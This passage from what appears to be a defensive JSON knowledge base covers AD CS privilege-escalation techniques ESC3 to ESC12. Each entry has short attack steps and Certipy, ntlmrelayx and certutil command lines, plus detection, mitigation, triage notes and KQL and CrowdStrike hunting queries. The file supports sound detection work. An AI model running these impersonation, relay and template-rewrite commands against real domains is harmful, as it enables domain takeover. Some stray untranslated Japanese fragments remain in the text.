an Enrollment Agent certificate with `certipy req`, (2) issue a certificate on behalf of the target user with `certipy req -template User -on-behalf-of 'domain\\administrator' -pfx agent.pfx`, (3) authenticate with `certipy auth`.","tools":"Certipy (req -on-behalf-of), Certify request /onbehalfof /enrollcert","detect":"Correlate issuance of an Enrollment Agent certificate (4887) with subsequent on-behalf-of issuance (4886/4887 where requester and certificate Subject differ). On-behalf-of issuance is rare, so it is a high-signal indicator even in isolation.","events":"4886, 4887","mitigate":"Strictly limit issuance of Enrollment Agent EKU templates, and configure Enrollment Agent Restrictions on the CA (who may enroll on whose behalf, using which templates). Delete unneeded Enrollment Agent templates.","triage":"On the CA pull 4887 for issuance of an Enrollment Agent EKU (1.3.6.1.4.1.311.20.2.1) cert, then correlate subsequent 4886/4887 on-behalf-of issuances where the requester (agent) differs from the cert Subject. It is malicious if a low-priv account gets an agent cert, then immediately enrolls on behalf of a privileged Subject like administrator, chained to 4768/auth with that PFX. On-behalf-of issuance is rare so it is high-signal even alone. It is benign when a PKI/ID team runs approved smartcard bulk issuance or an enrollment kiosk under a sanctioned agent account, with targets being ordinary users and no privileged Subject.","hunt":[{"plat":"Sentinel","t":"Issuance of a Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1) cert = malicious enrollment-agent grab / approved agent use = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4887\n| where Properties has \"1.3.6.1.4.1.311.20.2.1\" or Properties has \"Certificate Request Agent\"\n| project TimeGenerated, Computer, Account, SubjectUserName, ObjectName, Properties\n| order by TimeGenerated desc"},{"plat":"Sentinel","t":"On-behalf-of enrollment where requester != cert subject = malicious ESC3 / normal self-enrollment = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where Properties has \"on behalf of\" or Properties has \"RequesterName\"\n| project TimeGenerated, Computer, EventID, Account, SubjectUserName, ObjectName, Properties\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"Enrollment-Agent on-behalf-of proxied enrollment = malicious; sanctioned smartcard enroll agent = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*-on-behalf-of*\" OR CommandLine=\"*on_behalf_of*\" OR CommandLine=\"*/onbehalfof*\" OR CommandLine=\"*enrollment agent*\" OR (CommandLine=\"*certipy*\" AND CommandLine=\"*-pfx*\" AND CommandLine=\"*-template*\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"ESC4 - Vulnerable Certificate Template Access Control","aka":"Template ACL rewrite","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"High","summary":"When a low-privileged user holds Write/WriteDacl/FullControl etc. over a certificate template object, they rewrite the template configuration to be ESC1-equivalent and then abuse it.","how":"Prerequisites: WriteOwner/WriteDacl/WriteProperty etc. over the template AD object (CN=...,CN=Certificate Templates,CN=Public Key Services). Convert to ESC1 with `certipy template -template <tmpl> -write-default-configuration` (adding ENROLLEE_SUPPLIES_SUBJECT, setting EKU to Client Auth, removing approval requirements), issue and authenticate as in ESC1, then restore the original configuration.","tools":"Certipy template (旧-save-old/-configuration), StandIn, PowerView Set-ADObject","detect":"Monitor changes to the template object (5136 directory service object change) for modifications to msPKI-Certificate-Name-Flag / pKIExtendedKeyUsage / msPKI-Enrollment-Flag. Enable SACL auditing in advance.","events":"5136, 4899(テンプレート更新), 4886, 4887","mitigate":"Review template DACLs and limit write rights to the PKI admin group only. Configure change auditing (SACL) on the Certificate Templates container and set up 5136 alerts.","triage":"On the DC pull 5136 for changes to the template AD object under CN=Certificate Templates,CN=Public Key Services and check edits to msPKI-Certificate-Name-Flag (adding ENROLLEE_SUPPLIES_SUBJECT), pKIExtendedKeyUsage (to Client Auth), and msPKI-Enrollment-Flag (removing approval). It is malicious if a non-PKI principal flips these, issues an ESC1-style cert (4886/4887/4899 template update), then reverts to the original config shortly after — the revert is a strong signal. It is benign when a PKI admin makes a ticketed template design change, shown by SACL audit as an approved admin in business hours with no rapid revert.","hunt":[{"plat":"Sentinel","t":"Template object change (5136/4899) altering SD/Name-Flag/EKU/Enrollment-Flag = malicious ESC4 / legit PKI admin update = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5136, 4899)\n| where ObjectName has \"Certificate Templates\" or Properties has \"pKICertificateTemplate\"\n| where Properties has_any (\"nTSecurityDescriptor\", \"msPKI-Certificate-Name-Flag\", \"pKIExtendedKeyUsage\", \"msPKI-Enrollment-Flag\")\n| project TimeGenerated, Computer, EventID, SubjectUserName, ObjectName, OperationType, Properties\n| order by TimeGenerated desc"},{"plat":"MDE","t":"Certipy/Certify weakening a template (ACL rewrite/save) = malicious / manual template read = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"certipy\", \"Certify\")\n| where ProcessCommandLine has_any (\"template\", \"-write\", \"ESC4\", \"-save-old\", \"nTSecurityDescriptor\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine\n| order by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"certipy template rewrite (write-default-configuration etc.) altering ACL/EKU/name-flag = malicious; PKI admin change = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/certipy.*template/i\n| CommandLine=/(-write-default-configuration|-write-configuration|-save-old|msPKI-Certificate-Name-Flag|pKIExtendedKeyUsage|msPKI-Enrollment-Flag)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Identity Protection","t":"pKICertificateTemplate DACL change (5136) is DC-only; covered by Identity Protection when no host tooling footprint exists","q":"// Falcon Identity Protection detection: AD CS template security-descriptor / attribute modification (ESC4). 5136 is DC-only, not in Falcon EDR; pivot to attacker host certipy/Certify via ProcessRollup2."}]},{"name":"ESC5 - Vulnerable PKI Object Access Control","aka":"PKI object / CA server takeover","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"High","summary":"Abuse excessive rights over CA AD objects (pKIEnrollmentService, NTAuthCertificates), the CA server's computer object, or related AD containers to alter PKI-wide configuration or gain control of the CA.","how":"Prerequisites: write rights over objects under CN=Public Key Services (Enrollment Services, NTAuthCertificates, AIA/CDP) or the CA host computer object. Add an attacker CA certificate to NTAuthCertificates, or take over the CA computer via RBCD/shadow credentials and escalate to ESC7/Golden Certificate.","tools":"Certipy, PowerView, BloodHound, StandIn, Rubeus/Whisker(シャドウクレデンシャル)","detect":"Monitor changes (5136) to NTAuthCertificates and Enrollment Services objects, and modifications to msDS-KeyCredentialLink/msDS-AllowedToActOnBehalf on the CA computer object. Periodically audit reachability with BloodHound.","events":"5136, 4662, 4742(コンピュータ変更)","mitigate":"Restrict rights under Public Key Services and on the CA host to Tier0 admins. Isolate CA servers as Tier0 assets, and strictly limit delegation (RBCD) and KeyCredential writes.","triage":"On the DC pull 5136/4662 for writes to objects under CN=Public Key Services (NTAuthCertificates, Enrollment Services, AIA/CDP) and 4742 (computer change) on the CA computer object, especially msDS-KeyCredentialLink/msDS-AllowedToActOnBehalfOfOtherIdentity edits. It is malicious if a non-PKI principal adds a rogue CA cert to NTAuthCertificates or sets shadow credentials/RBCD on the CA computer, chaining toward ESC7/Golden Certificate; audit reachability periodically with BloodHound. It is benign when a PKI team performs a sanctioned CA addition, PKI-hierarchy update, or CRL/AIA publication-point change under change management.","hunt":[{"plat":"Sentinel","t":"5136 edits to PKI container ACLs or KeyCredentialLink on NTAuth/Enrollment objects. Any rewrite = black / never seen in normal ops = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has_any (\"NTAuthCertificates\",\"Enrollment Services\",\"AIA\",\"Public Key Services\",\"Certificate Templates\")\n| where Properties has_any (\"nTSecurityDescriptor\",\"msDS-KeyCredentialLink\",\"msDS-AllowedToActOnBehalfOfOtherIdentity\")\n| project TimeGenerated, Computer, Actor=SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"4662 WriteDacl/WriteOwner on PKI objects. Ownership-write masks by non-delegated principal = black / known admin change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where ObjectName has \"Public Key Services\" or Properties has \"Certificate\"\n| where AccessMask in (\"0x40000\",\"0x80000\")\n| summarize count() by Computer, SubjectUserName, ObjectName, AccessMask\n| where count_ > 0\n// AccessMask 0x40000=WriteDacl 0x80000=WriteOwner"}],"huntcs":[{"plat":"Event Search","t":"Shadow-credential/ACL abuse tools targeting CA objects = bad / legit PKI admin = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*KeyCredentialLink*\" OR CommandLine=\"*Whisker*\" OR CommandLine=\"*pywhisker*\" OR CommandLine=\"*certipy*shadow*\" OR CommandLine=\"*Set-ADComputer*\")\n| where NOT ParentBaseFileName IN (\"mmc.exe\",\"ServerManager.exe\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"CA/NTAuth object ACL or KeyCredentialLink change is DC-only; defer to IdP","q":"// Falcon Identity Protection detection: Privileged AD object ACL / msDS-KeyCredentialLink modification on CA / Enrollment Services / NTAuthCertificates objects (5136/4662 — no attacker-host endpoint footprint)"}]},{"name":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag","aka":"CA-level arbitrary-SAN flag","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"Critical","summary":"When the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, the SAN can be arbitrarily specified via request attributes regardless of template settings, enabling impersonation with any authentication template.","how":"Prerequisites: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the CA policy module (check with `certutil -getreg policy\\EditFlags`). Request any Client Auth template with a SAN attribute, e.g., `certipy req -upn administrator@domain.local`, obtaining a DA impersonation certificate and authenticating. Note that even after the CVE-2022-26923 patch, the SAN takes precedence when this flag is enabled.","tools":"Certipy req (-upn/-sid), Certify request /altname","detect":"Periodically audit the CA's EditFlags. Detect issuance of certificates with a SAN (UPN) different from the requester via 4887. `certipy find` flags this as ESC6.","events":"4887, 4886, 4768","mitigate":"Disable the flag with `certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` and restart the CA (AD CS) service. Periodically compare CA registry configuration against a baseline.","triage":"On the CA host periodically capture certutil -getreg policy\\EditFlags to audit whether EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled, correlating 4885/4890/4892 (CA config change) when it flips on. It is malicious if, with the flag on, any Client Auth template request carries a SAN attribute (-upn/-sid), 4887 issues a cert with a UPN different from the requester, and 4768/4886 PKINIT auth follows — SAN wins under this flag even after the CVE-2022-26923 patch. It leans benign if the flag has been on for legacy operational reasons and issued SANs match the requester's own identity for legitimate service certs only.","hunt":[{"plat":"Sentinel","t":"4887 issued cert carrying SAN/UPN that differs from requester. Arbitrary UPN in SAN = black / no SAN, self-subject = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4887\n| where Properties has_any (\"Subject Alternative Name\",\"SAN\",\"upn\",\"otherName\")\n| project TimeGenerated, Computer, Requester=SubjectUserName, ObjectName, Properties\n// compare requester vs UPN inside Properties; mismatch = ESC6\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Cert-based Kerberos TGT (4768 w/ Certificate Information) right after issuance. Auth as privileged UPN != requester = black / password TGT = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"\n| summarize certTgt=count(), ips=make_set(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)\n| where certTgt > 0\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"certutil -setreg enabling EDITF_ATTRIBUTESUBJECTALTNAME2 on CA = bad","q":"event_simpleName=ProcessRollup2 FileName=certutil.exe CommandLine=\"*-setreg*\" CommandLine=\"*EditFlags*\"\n| stats count by ComputerName, UserName, CommandLine, ParentBaseFileName"},{"plat":"Event Search","t":"certipy req supplying an arbitrary UPN/SAN = bad / normal enrollment = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*certipy*req*\" OR CommandLine=\"*Certify*request*\") (CommandLine=\"*-upn*\" OR CommandLine=\"*-altname*\" OR CommandLine=\"*/altname*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"}]},{"name":"ESC7 - Vulnerable CA Access Control (ManageCA / ManageCertificates)","aka":"CA privilege escalation","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"Critical","summary":"When a low-privileged user holds ManageCA (CA administrator) or ManageCertificates (certificate manager) rights on the CA, they seize control of certificate issuance by changing CA flags, approving failed requests, enabling templates, etc.","how":"Prerequisites: ManageCA/ManageCertificates granted in the CA security settings. Method (A): use ManageCA to enable EDITF_ATTRIBUTESUBJECTALTNAME2 and convert to ESC6. Method (B): request the SubCA template → have it denied, then force-approve the failed request with ManageCertificates via `certipy ca -issue-request <ID>` to obtain the certificate.","tools":"Certipy ca (-add-officer/-enable-template/-issue-request), Certify, PSPKI","detect":"Monitor changes to CA role assignments, correlation where a denied request (4888 = request denied) is later issued (4887) under the same RequestID, and force-approval of failed requests via ManageCertificates. Detect CA officer additions (4890/4892 CA configuration change).","events":"4882(CAセキュリティ変更), 4885/4890/4892(CA構成/役割変更), 4887","mitigate":"Grant ManageCA/ManageCertificates only to a minimal set of PKI admins. Audit CA rights changes and disable dangerous templates such as SubCA. Periodically inventory CA officers with `certipy find`/PSPKI.","triage":"On the CA pull 4882 (CA security change)/4890/4892 (CA officer, config/role change) for ManageCA/ManageCertificates grants or CA officer additions and check two paths. Path A: ManageCA enables EDITF_ATTRIBUTESUBJECTALTNAME2 chaining to ESC6. Path B: a SubCA template request is denied (4888), then the same RequestID is issued via 4887 — force-approval of a failed request through ManageCertificates. It is malicious when a non-PKI principal grants rights, force-approves, then authenticates. It is benign when a PKI officer performs legitimate reissuance/revocation recovery within an approval workflow and the deny-then-approve matches operational procedure and a ticket.","hunt":[{"plat":"Sentinel","t":"CA security/officer/config change (4882/4885/4890/4892). Granting ManageCA/ManageCertificates = black / zero changes = white","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4882, 4885, 4890, 4892)\n| project TimeGenerated, Computer, EventID, Activity, Actor=SubjectUserName, Properties\n| sort by TimeGenerated desc\n// any CA role/permission change is rare -> investigate each"},{"plat":"Sentinel","t":"Same RequestID denied (4888) then issued (4887). Force-approval of a denied request = black / denials only or unrelated issuance = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4887, 4888)\n| extend ReqId = extract(@\"Request ID:\\s*(\\S+)\", 1, Properties)\n| where isnotempty(ReqId)\n| summarize evts=make_set(EventID), actors=make_set(SubjectUserName) by ReqId, Computer\n| where evts has 4888 and evts has 4887"}],"huntcs":[{"plat":"Event Search","t":"certipy ca -add-officer/-add-manager granting CA roles = bad / legit CA admin = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*certipy*ca*\" (CommandLine=\"*-add-officer*\" OR CommandLine=\"*-add-manager*\" OR CommandLine=\"*-enable-template*\")) OR (FileName=certutil.exe CommandLine=\"*-setreg*\" CommandLine=\"*Security*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"}]},{"name":"ESC8 - NTLM Relay to AD CS HTTP Web Enrollment","aka":"PetitPotam + Web Enrollment relay","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1557, T1187, T1649","cve":"","sev":"Critical","summary":"When the CA's Web Enrollment endpoint (certsrv, /certsrv/certfnsh.asp) accepts HTTP+NTLM, relay the authentication of a victim machine (especially a DC) via NTLM to have a client-auth certificate issued for that machine account.","how":"Prerequisites: HTTP Web Enrollment enabled and EPA (Extended Protection) not configured. Start a relay server with `certipy relay -target http://<ca>/certsrv`, coerce DC$ authentication via PetitPotam/PrinterBug/DFSCoerce etc., and relay to obtain a DC$ certificate. Use the certificate with `certipy auth` to get DC$'s TGT → escalate to DCSync.","tools":"Certipy relay, ntlmrelayx -t http://ca/certsrv/certfnsh.asp, PetitPotam, Coercer, PrinterBug, DFSCoerce","detect":"Anomalous machine-account authentication in Web Enrollment (IIS) access logs. DomainController/Machine certificate issuance to computer accounts via 4886/4887. Mismatch between source IP and the expected host, and coercion via MS-EFSR/MS-RPRN.","events":"4886, 4887, 4768, IISログ(certsrv), 5145(EFSRPC/spoolss)","mitigate":"On HTTP Web Enrollment, enforce EPA (Extended Protection for Authentication), channel binding/HTTPS, and disable NTLM (Kerberos/Negotiate only). Remove the Web Enrollment role if unneeded. Apply coercion countermeasures for PetitPotam etc. (patches, RPC filters).","triage":"Pull the CA IIS (certsrv) access log and Windows 4886/4887 and check whether a DomainController/Machine template cert is issued to a computer account (e.g. DC$) while the source IP does not match that host (it's the relay server IP). It is malicious if at the same time DC/file-server 5145 shows MS-EFSR (EfsRpcOpenFileRaw) or MS-RPRN (spoolss) coercion, followed by DC$ 4768 (TGT) and DCSync-like behavior. It is benign when a vuln scanner or a monitoring server like SCOM legitimately hits Web Enrollment with no cert issuance and only self-host auth. If EPA/require-signing is on and the requesting IP matches the real host it leans benign.","hunt":[{"plat":"Sentinel","t":"Computer account requesting/issued Machine/DC cert via Web Enrollment (4886/4887). $-account request from odd IP = black / user request = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where SubjectUserName endswith \"$\"\n| where Properties has_any (\"Machine\",\"DomainController\",\"Workstation Authentication\")\n| summarize reqs=count(), ips=make_set(IpAddress), tmpl=make_set(ObjectName) by Computer, Requester=SubjectUserName\n| where reqs > 0"},{"plat":"MDI","t":"Machine-account NTLM auth targeting the CA host (relay footprint). $-account NTLM to CA = black / normal Kerberos = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\"\n| where AccountName endswith \"$\"\n| where DestinationDeviceName has \"CA\" or TargetDeviceName has \"CA\"  // confirm CA hostname in your tenant\n| summarize count() by AccountName, DeviceName, DestinationDeviceName, IPAddress\n| where count_ > 0"}],"huntcs":[{"plat":"Event Search","t":"Coercion + relay tooling (PetitPotam/Coercer/ntlmrelayx/certipy relay) execution = bad","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*PetitPotam*\" OR CommandLine=\"*Coercer*\" OR CommandLine=\"*ntlmrelayx*\" OR CommandLine=\"*certipy*relay*\" OR CommandLine=\"*-target*certsrv*\" OR CommandLine=\"*/certsrv/certfnsh.asp*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"LogScale","t":"One host fanning SMB/445 auth to a non-CA relay host = coercion callback / steady DC traffic = benign","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445\n| ConnectionDirection=0\n| groupBy([aid, ComputerName], function=count(RemoteAddressIP4, distinct=true, as=fanout))\n| fanout>=3\n| sort(fanout, order=desc)"}]},{"name":"ESC9 - No Security Extension (szOID_NTDS_CA_SECURITY_EXT)","aka":"CT_FLAG_NO_SECURITY_EXTENSION abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a template has CT_FLAG_NO_SECURITY_EXTENSION set so the certificate lacks the SID-binding security extension, impersonation via UPN rewrite (similar to ESC10) is possible when StrongCertificateBindingEnforcement is compatibility (1)/disabled (0). Under full enforcement (2), certificates lacking the SID extension are rejected and this fails.","how":"Prerequisites: NO_SECURITY_EXTENSION in the target template's msPKI-Enrollment-Flag, plus UPN-rewrite rights (GenericWrite) over the victim account. Rewrite the victim account's userPrincipalName to administrator → enroll the NO_SECURITY_EXTENSION template as that account → revert the UPN → authenticate as administrator with the obtained certificate. Because SID binding is absent, UPN mapping grants the escalation.","tools":"Certipy (account update -upn, req, auth), PowerView Set-ADObject","detect":"Frequent changes to account userPrincipalName (5136), and authentication with certificates lacking the SID security extension. Monitor mismatches between the Certificate Information field and the account SID via 4768/4769.","events":"5136, 4886, 4887, 4768","mitigate":"Remove the NO_SECURITY_EXTENSION flag from templates and require the SID security extension. Apply KB5014754 enforcement mode (StrongCertificateBindingEnforcement=2). Restrict UPN-rewrite rights (GenericWrite).","triage":"On the DC pull 5136 for a round-trip where a victim account's userPrincipalName is briefly rewritten to administrator and reverted, and correlate 4886/4887 in that window for issuance from a template whose msPKI-Enrollment-Flag has NO_SECURITY_EXTENSION. It is malicious if 4768/4769 with that cert show a mismatch between Certificate Information and the account SID (UPN-mapping escalation from the missing SID binding), chained to the UPN round-trip by the same principal at close timestamps. It is benign when a legitimate account rename/email change permanently updates the UPN with no revert and the issued cert is for the user's own use. A lone UPN change with no cert request leans benign.","hunt":[{"plat":"Sentinel","t":"Repeated userPrincipalName rewrites on one object (5136). Multiple UPN edits in a short window = black / single legit change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"userPrincipalName\"\n| summarize changes=count(), actors=make_set(SubjectUserName) by ObjectName, bin(TimeGenerated, 2h)\n| where changes >= 2\n| sort by changes desc"},{"plat":"Sentinel","t":"Kerberos auth with cert lacking SID security extension (4768/4769). Cert UPN vs account mismatch = black / SID-ext present = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4769)\n| where Properties has \"Certificate\"\n| project TimeGenerated, Computer, TargetUserName, IpAddress, Properties\n// verify Certificate Information UPN != TargetUserName SID -> ESC9\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"certipy UPN-swap flow abusing certs lacking the SID security extension = bad","q":"event_simpleName=ProcessRollup2 CommandLine=\"*certipy*\" (CommandLine=\"*-upn*\" OR CommandLine=\"*account*update*\" OR CommandLine=\"*-old-bloodhound*\" OR CommandLine=\"*auth*-pfx*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"Cert-SID vs account-SID mismatch at auth is DC/KDC-only; defer to IdP","q":"// Falcon Identity Protection detection: certificate authentication where szOID_NTDS_CA_SECURITY_EXT SID does not match the authenticating account (4768/4769 — no attacker-host telemetry)"}]},{"name":"ESC10 - Weak Certificate Mapping","aka":"UPN mapping abuse / weakened StrongCertificateBindingEnforcement","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When the registry StrongCertificateBindingEnforcement=0 (Kerberos) or CertificateMappingMethods allows UPN mapping (Schannel), certificate UPN/mail attributes are weakly mapped, allowing impersonation of another user via UPN rewrite.","how":"Prerequisites (Case1): StrongCertificateBindingEnforcement=0. Rewrite the victim account's UPN to administrator → enroll any Client Auth template → revert the UPN → authenticate as admin with the certificate. Prerequisites (Case2): Schannel CertificateMappingMethods 0x4 (UPN) enabled. Blank a machine account's UPN and rewrite it to DC$@... to impersonate the DC via Schannel (LDAPS etc.).","tools":"Certipy (account update, req, auth -ldap-shell), PowerView","detect":"Audit the registry values of StrongCertificateBindingEnforcement / Schannel CertificateMappingMethods. Monitor temporary UPN attribute rewrites (5136) and Schannel/Kerberos authentication using weak mappings.","events":"5136, 4768, 4769, 4624(Schannel)","mitigate":"Set StrongCertificateBindingEnforcement=2 (enforce). Remove UPN (0x4) from Schannel CertificateMappingMethods and allow only strong mapping (SKI/Issuer+Serial). Apply KB5014754-compliant patches and restrict UPN-rewrite rights.","triage":"Audit the registry on the CA host/DC for StrongCertificateBindingEnforcement (Kdcsvc) and Schannel CertificateMappingMethods, confirm weak values 0/0x4, and pull DC 5136 for temporary UPN rewrites. Case1: victim UPN rewritten to administrator, any Client Auth request, UPN reverted, then 4768 impersonates admin. Case2: a machine account's UPN is emptied and set to DC$@… then 4624 (Schannel logon, LDAPS) impersonates the DC. It is malicious when the UPN round-trip and weak-mapping auth chain from one principal. It is benign in a patched environment with Enforcement=2, or when a UPN change is a legitimate rename with no revert and no weak-mapping auth.","hunt":[{"plat":"MDE","t":"Weakening StrongCertificateBindingEnforcement / Schannel CertificateMappingMethods on a DC (registry). Enforcement lowered = black / unchanged = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryValueName in (\"StrongCertificateBindingEnforcement\",\"CertificateMappingMethods\")\n| where RegistryKey has @\"Kdc\" or RegistryKey has @\"SecurityProviders\\SCHANNEL\"\n| where ActionType == \"RegistryValueSet\"\n| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"Temporary UPN rewrite (5136) on a victim account enabling weak mapping. Rewrite→auth→revert pattern = black / stable legit UPN = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"userPrincipalName\"\n| summarize edits=count() by ObjectName, SubjectUserName, bin(TimeGenerated, 1h)\n| where edits >= 2"}],"huntcs":[{"plat":"Event Search","t":"Weakening StrongCertificateBindingEnforcement or SCHANNEL CertificateMappingMethods = bad","q":"event_simpleName IN (RegSystemConfigValueUpdate, RegGenericValueUpdate) (RegValueName=\"StrongCertificateBindingEnforcement\" OR RegValueName=\"CertificateMappingMethods\")\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"}]},{"name":"ESC11 - NTLM Relay to ICertPassage RPC (IF_ENFORCEENCRYPTICERTREQUEST)","aka":"RPC relay to CA","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1557, T1649","cve":"","sev":"High","summary":"When the CA's ICertPassage (MS-ICPR) RPC interface does not enforce packet privacy (encryption), relay NTLM authentication over RPC to have a certificate issued. An RPC variant of ESC8 that needs no Web Enrollment.","how":"Prerequisites: IF_ENFORCEENCRYPTICERTREQUEST not set in the CA registry InterfaceFlags. Start a relay server targeting the ICPR RPC endpoint (-rpc) with a patched ntlmrelayx/Certipy, coerce victim account authentication, and relay over RPC to have that certificate issued for use in authentication.","tools":"Certipy relay -target rpc://<ca>, ntlmrelayx(-rpc ICPR対応版), PetitPotam/Coercer","detect":"Detect certificate requests via RPC (ICPR) through 4886/4887 and mismatches between the requester and the network path. Correlate coercion events with CA issuance.","events":"4886, 4887, 4768, 5145","mitigate":"Enable IF_ENFORCEENCRYPTICERTREQUEST on the CA (`certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) to enforce RPC encryption. Apply domain-wide NTLM restrictions and coercion countermeasures (RPC filters).","triage":"Audit the CA registry InterfaceFlags for a missing IF_ENFORCEENCRYPTICERTREQUEST, pull 4886/4887 for cert requests via ICPR RPC (ICertPassage, MS-ICPR), and check whether the source IP/network path mismatches the real host. It is malicious if at the same time 5145 or coercion events induce victim-account auth and the relay-issued cert chains into 4768 auth right after. It is benign when legitimate RPC-based enrollment (older clients/certreq) comes from the true host with victim equal to requester and no coercion artifacts. If InterfaceFlags already enforces RPC encryption it leans benign.","hunt":[{"plat":"Sentinel","t":"Cert request via ICPR RPC (4886/4887) with machine account and mismatched source IP. $-request from multiple IPs = black / single self-host = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where SubjectUserName endswith \"$\"\n| summarize reqs=count(), srcIps=make_set(IpAddress), tmpl=make_set(ObjectName) by Computer, Requester=SubjectUserName\n| where array_length(srcIps) > 1 or reqs > 3\n// RPC relay: requester host != authenticating IP"},{"plat":"MDI","t":"Coercion-driven machine-account NTLM landing on the CA. $-account NTLM to CA + issuance follow = black / normal Kerberos = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\"\n| where AccountName endswith \"$\"\n| where DestinationDeviceName has \"CA\" or TargetDeviceName has \"CA\"  // confirm CA hostname\n| summarize count() by AccountName, DeviceName, DestinationDeviceName, IPAddress\n| where count_ > 0"}],"huntcs":[{"plat":"Event Search","t":"ntlmrelayx/certipy relay aimed at ICertPassage RPC (-t rpc://CA) = bad","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ntlmrelayx*\" OR CommandLine=\"*certipy*relay*\") (CommandLine=\"*rpc://*\" OR CommandLine=\"*-icpr*\" OR CommandLine=\"*-rpc*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"LogScale","t":"One host fanning RPC (135/dynamic) to CA = relayed enrollment / steady mgmt = benign","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=135\n| ConnectionDirection=0\n| groupBy([aid, ComputerName, ContextBaseFileName], function=count(RemoteAddressIP4, distinct=true, as=fanout))\n| fanout>=2\n| sort(fanout, order=desc)"}]},{"name":"ESC12 - Shell Access to ADCS CA with YubiHSM","aka":"HSM static PIN abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1552.002","cve":"","sev":"High","summary":"Even when the CA private key is stored in an HSM such as a YubiHSM, if a static PIN is stored in the registry and a shell can be obtained on the CA, the CA private key can be used via the HSM to forge a Golden Certificate.","how":"Prerequisites: administrator shell on the CA server, and the HSM auth key (PIN) stored in cleartext in the registry (e.g., HKLM\\SOFTWARE\\Yubico\\YubiHSM). Read the PIN, sign using the CA private key via yubihsm-connector, and forge a certificate for any user (Golden Certificate) for long-term impersonation/persistence.","tools":"reg query, yubihsm-shell/connector, Certipy forge, ForgeCert","detect":"Monitor interactive logons to the CA server (4624 type2/10) and reads of sensitive registry keys. Detect unexpected signing activity with the CA key and long-lived certificate authentication derived from Golden Certificates (4768).","events":"4624, 4672, 4768","mitigate":"Strictly isolate the CA server as Tier0 and minimize shell access. Do not store the HSM PIN in cleartext in the registry; manage it securely and audit HSM operations. Restrict privileged access to the CA server to PAW-only.","triage":"On the CA server pull 4624 (Logon Type 2 interactive/10 RDP) plus 4672 for an interactive logon by a principal with HSM admin rights 